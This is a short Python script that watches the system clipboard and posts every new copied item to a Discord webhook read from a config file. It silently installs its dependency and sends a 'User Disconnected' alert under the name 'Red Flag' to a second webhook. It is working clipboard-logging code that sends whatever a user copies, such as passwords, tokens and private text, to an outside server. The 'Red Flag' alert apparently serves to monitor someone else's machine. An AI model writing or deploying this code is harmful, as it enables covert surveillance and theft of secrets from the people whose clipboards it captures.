import os
import time
import requests
import json

try:
	import pyperclip
except:
	os.system("py -m pip install pyperclip")
finally:
	import pyperclip
	
with open("webhook.json", "r") as f:
	whData = json.loads(f.read())
hookURL = whData["esc"]
logURL = whData["log"]

while True:
	try:
		newCOPY = pyperclip.waitForNewPaste()
		print(newCOPY)
		if newCOPY.strip() != "":
			newCOPY = "```\n" + newCOPY + "\n```"
		else:
			newCOPY = "`INVALID PASTER`"
		usrhook = {"content": newCOPY,
			"username": "Kopier",
			"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
			"tts": "false"}
		ping = requests.post(hookURL, json=usrhook)
	except pyperclip.PyperclipWindowsException:
		print("EOP: End of Program")
		try:
			pyperclip.copy('```Pixel Copy Detected```')
		except:
			newCOPY = '`User Disconnected`'
			usrhook = {"content": newCOPY,
				"username": "Red Flag",
				"avatar_url": 'https://media.discordapp.net/attachments/871719349809971220/1223331266695266424/5TRKaAyjc.png?ex=66197706&is=66070206&hm=a06c48fb0ac8e0d1f34c67ba1609c72e374d91333d63db5f05cfc1452f82470e&=',
				"tts": "false"}
			ping = requests.post(logURL, json=usrhook)
			break